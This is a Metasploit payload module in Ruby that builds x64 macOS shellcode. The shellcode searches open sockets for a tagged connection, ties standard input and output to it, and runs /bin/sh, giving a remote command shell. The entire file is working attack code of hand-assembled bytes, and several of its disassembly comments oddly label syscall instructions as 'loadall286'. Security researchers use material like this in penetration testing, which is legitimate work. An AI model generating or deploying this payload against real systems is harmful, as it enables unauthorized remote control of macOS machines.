##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 107

  include Msf::Payload::Single
  include Msf::Payload::Osx
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'OSX Command Shell, Find Tag Inline',
        'Description' => 'Spawn a shell on an established connection (proxy/NAT safe)',
        'Author' => 'nemo <nemo[at]felinemenace.org>',
        'License' => MSF_LICENSE,
        'Platform' => 'osx',
        'Arch' => ARCH_X64,
        'Handler' => Msf::Handler::FindTag,
        'Session' => Msf::Sessions::CommandShellUnix
      )
    )
    # exec payload options
    register_options(
      [
        OptString.new('CMD', [ true, 'The command string to execute', '/bin/sh' ]),
        OptString.new('TAG', [ true, 'The tag to test for', 'NEMO' ]),
      ]
    )
  end

  #
  # ensures the setting of tag to a four byte value
  #
  def generate(_opts = {})
    cmd = (datastore['CMD'] || '') + "\x00"
    call = "\xe8" + [cmd.length].pack('V')

    "\x48\x31\xFF" + # xor rdi,rdi
      "\x57" +                            # push rdi
      "\x48\x89\xE6" +                    # mov rsi,rsp
      "\x6A\x04" +                        # push byte +0x4
      "\x5A" +                            # pop rdx
      "\x48\x8D\x4A\xFE" +                # lea rcx,[rdx-0x2]
      "\x4D\x31\xC0" +                    # xor r8,r8
      "\x4D\x31\xC9" +                    # xor r9,r9
      "\x48\xFF\xCF" +                    # dec rdi
      "\x48\xFF\xC7" +                    # inc rdi
      "\xB8\x1D\x00\x00\x02" +            # mov eax,0x200001d
      "\x0F\x05" +                        # loadall286
      "\x81\x3C\x24" +                    # cmp dword [rsp],0x4e454d4f
      datastore['TAG'] +
      "\x75\xED" +                        # jnz 0x17
      "\x48\x31\xC9" +                    # xor rcx,rcx
      "\xB8\x1D\x00\x00\x02" +            # mov eax,0x200001d
      "\x0F\x05" +                        # loadall286
      "\xB8\x5A\x00\x00\x02" +            # mov eax,0x200005a
      "\x48\x31\xF6" +                    # xor rsi,rsi
      "\x0F\x05" +                        # loadall286
      "\xB8\x5A\x00\x00\x02" +            # mov eax,0x200005a
      "\x48\xFF\xC6" +                    # inc rsi
      "\x0F\x05" +                        # loadall286
      "\x48\x31\xC0" +                    # xor rax,rax
      "\xB8\x3B\x00\x00\x02" +            # mov eax,0x200003b
      call +
      cmd +
      "\x48\x8B\x3C\x24" +                # mov rdi,[rsp]
      "\x48\x31\xD2" +                    # xor rdx,rdx
      "\x52" +                            # push rdx
      "\x57" +                            # push rdi
      "\x48\x89\xE6" +                    # mov rsi,rsp
      "\x0F\x05"                          # loadall286
  end
end
